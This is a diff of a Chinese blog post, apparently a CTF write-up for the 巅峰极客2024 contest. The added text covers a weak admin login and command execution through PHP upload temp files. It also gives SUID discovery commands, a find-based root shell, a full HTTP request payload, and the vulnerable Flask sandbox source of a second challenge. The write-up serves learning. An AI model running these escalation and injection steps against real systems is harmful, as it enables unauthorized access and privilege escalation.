@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://baozongwi.xyz/images/QQ20240817-175458.png">
 <meta property="og:image" content="https://baozongwi.xyz/images/QQ20240817-180256.png">
 <meta property="article:published_time" content="2024-08-17T09:40:28.000Z">
-<meta property="article:modified_time" content="2024-08-17T14:04:41.752Z">
+<meta property="article:modified_time" content="2024-08-19T04:48:57.624Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="赛题">
 <meta name="twitter:card" content="summary">
@@ -554,7 +554,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">23</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">25</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -608,8 +608,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-08-17 22:04:41</span>
-            <span class="mobile">2024-08-17 22:04:41</span>
+            <span class="desktop">2024-08-19 12:48:57</span>
+            <span class="mobile">2024-08-19 12:48:57</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -647,12 +647,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>629 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.4k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>3 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>7 Mins</span>
         </span>
     
     
@@ -713,8 +713,43 @@
                      data-src="/../images/QQ20240817-180256.png"
                       alt="3"
                 ></p>
-<h1 id="admin-Test-浮现"><a href="#admin-Test-浮现" class="headerlink" title="admin_Test(浮现)"></a>admin_Test(浮现)</h1><p>我以为是sql注入，fuzz之后又在哪里尝试时间盲注结果，我方向都错了</p>
-<h1 id="php-online"><a href="#php-online" class="headerlink" title="php_online"></a>php_online</h1>
+<h1 id="admin-Test-浮现思路"><a href="#admin-Test-浮现思路" class="headerlink" title="admin_Test(浮现思路)"></a>admin_Test(浮现思路)</h1><p>我以为是sql注入，fuzz之后又在哪里尝试时间盲注结果，我方向都错了</p>
+<p>首先弱密码进入(也可以直接进<code>/admin.html</code>)</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:admin</span><br><span class="line"></span><br><span class="line">password:qwe123!@#</span><br></pre></td></tr></table></figure></div>
+
+<p>然后上传恶意文件执行命令发现用户是<code>ctf</code>进行<code>suid</code>提权</p>
+<p>但是要执行命令还要通过<code>cmd</code>,先<code>fuzz</code>一下,只有</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空格</span><br><span class="line">.</span><br><span class="line">*</span><br><span class="line">/</span><br><span class="line">t</span><br></pre></td></tr></table></figure></div>
+
+<p>使用临时文件缓存进行命令执行</p>
+<p>这个姿势之前在<code>ctfshow</code>有了解过<code>web56</code></p>
+<blockquote>
+<p>在linux shell中，<code>.</code>可以用当前的shell执行一个文件中的命令，比如<code>.file</code>就是执行file文件中的命令。并且是不需要file有x权限</p>
+<p>上传文件之后,php会生成临时文件在&#x2F;tmp&#x2F;phpXXXXXX,其中XXXXXX为六个随机的大小写字母</p>
+</blockquote>
+<p>然后成功之后还需要提权，这里是<code>suid</code>提权</p>
+<p>查找文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure></div>
+
+<p>查看是否有<code>suid</code>权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al filename</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find filename -exec /bin/sh -p \; -quit</span><br><span class="line">进入交互式shell</span><br><span class="line"></span><br><span class="line">find 具有suid权限的filename -exec whoami \; -quit</span><br><span class="line">执行命令</span><br></pre></td></tr></table></figure></div>
+
+<p>那么这里就直接用find提权就行了,借用大头师傅的包</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: eci-2zegua8pognq2bylzh7v.cloudeci1.ichunqiu.com</span><br><span class="line">Content-Length: 310</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryExqFofGztZHH253r</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryExqFofGztZHH253r</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.test&quot;</span><br><span class="line">Content-Type: admin/admin</span><br><span class="line"></span><br><span class="line">find . -exec cat /flag \; -quit</span><br><span class="line">------WebKitFormBoundaryExqFofGztZHH253r</span><br><span class="line">Content-Disposition: form-data; name=&quot;cmd&quot;</span><br><span class="line"></span><br><span class="line">. /t*/*</span><br><span class="line">------WebKitFormBoundaryExqFofGztZHH253r--</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="php-online-浮现思路"><a href="#php-online-浮现思路" class="headerlink" title="php_online(浮现思路)"></a>php_online(浮现思路)</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, redirect, url_for, render_template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secrets.token_hex(<span class="number">16</span>)</span><br><span class="line">working_id = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.form[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">id</span>.isalnum() <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">id</span>) != <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;无效的ID&#x27;</span></span><br><span class="line">        session[<span class="string">&#x27;id&#x27;</span>] = <span class="built_in">id</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">f&#x27;/sandbox/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>):</span><br><span class="line">            os.popen(<span class="string">f&#x27;mkdir /sandbox/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span> &amp;&amp; chown www-data /sandbox/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span> &amp;&amp; chmod a+w /sandbox/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;sandbox&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;submit_id.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/sandbox&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;submit_code.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;no id&#x27;</span></span><br><span class="line">        user_id = session[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_id <span class="keyword">in</span> working_id:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;task is still running&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            working_id.append(user_id)</span><br><span class="line">            code = request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">            os.popen(<span class="string">f&#x27;cd /sandbox/<span class="subst">&#123;user_id&#125;</span> &amp;&amp; rm *&#x27;</span>).read()</span><br><span class="line">            os.popen(<span class="string">f&#x27;sudo -u www-data cp /app/init.py /sandbox/<span class="subst">&#123;user_id&#125;</span>/init.py &amp;&amp; cd /sandbox/<span class="subst">&#123;user_id&#125;</span> &amp;&amp; sudo -u www-data python3 init.py&#x27;</span>).read()</span><br><span class="line">            os.popen(<span class="string">f&#x27;rm -rf /sandbox/<span class="subst">&#123;user_id&#125;</span>/phpcode&#x27;</span>).read()</span><br><span class="line">            </span><br><span class="line">            php_file = <span class="built_in">open</span>(<span class="string">f&#x27;/sandbox/<span class="subst">&#123;user_id&#125;</span>/phpcode&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            php_file.write(code)</span><br><span class="line">            php_file.close()</span><br><span class="line"></span><br><span class="line">            result = os.popen(<span class="string">f&#x27;cd /sandbox/<span class="subst">&#123;user_id&#125;</span> &amp;&amp; sudo -u nobody php phpcode&#x27;</span>).read()</span><br><span class="line">            os.popen(<span class="string">f&#x27;cd /sandbox/<span class="subst">&#123;user_id&#125;</span> &amp;&amp; rm *&#x27;</span>).read()</span><br><span class="line">            working_id.remove(user_id)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>代码总共分为两部分,一个是<code>index</code>一个是<code>sandbox</code>,</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index:</span><br><span class="line">利用传入的id，注册账号进入沙盒(我思路都错了一位是session伪造，还是没有好好看代码)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sandbox:</span><br><span class="line">sudo -u nobody 基本没有什么权限</span><br><span class="line">并且有个init.py需要读</span><br></pre></td></tr></table></figure></div>
+
+<p><code>init.py</code>源码</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger.info(<span class="string">&quot;aaa&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+
         </div>
 
         
@@ -728,7 +763,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-08-17 22:04:41
+                    :</strong> 2024-08-19 12:48:57
             </li>
         
         <li>
@@ -764,6 +799,21 @@
 
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/08/18/GYCTF2020/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">GYCTF2020</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
                 
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
@@ -837,7 +887,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">巅峰极客2024</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#EncirclingGame"><span class="nav-text">EncirclingGame</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GoldenHornKing"><span class="nav-text">GoldenHornKing</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#admin-Test-%E6%B5%AE%E7%8E%B0"><span class="nav-text">admin_Test(浮现)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php-online"><span class="nav-text">php_online</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#EncirclingGame"><span class="nav-text">EncirclingGame</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GoldenHornKing"><span class="nav-text">GoldenHornKing</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#admin-Test-%E6%B5%AE%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="nav-text">admin_Test(浮现思路)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php-online-%E6%B5%AE%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="nav-text">php_online(浮现思路)</span></a></li></ol>
 
     </div>
 </div>
@@ -870,11 +920,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        23 posts in total
+                        25 posts in total
                     </span>
                     
                         <span>
-                            32.9k words in total
+                            37.5k words in total
                         </span>
                     
                 </p>
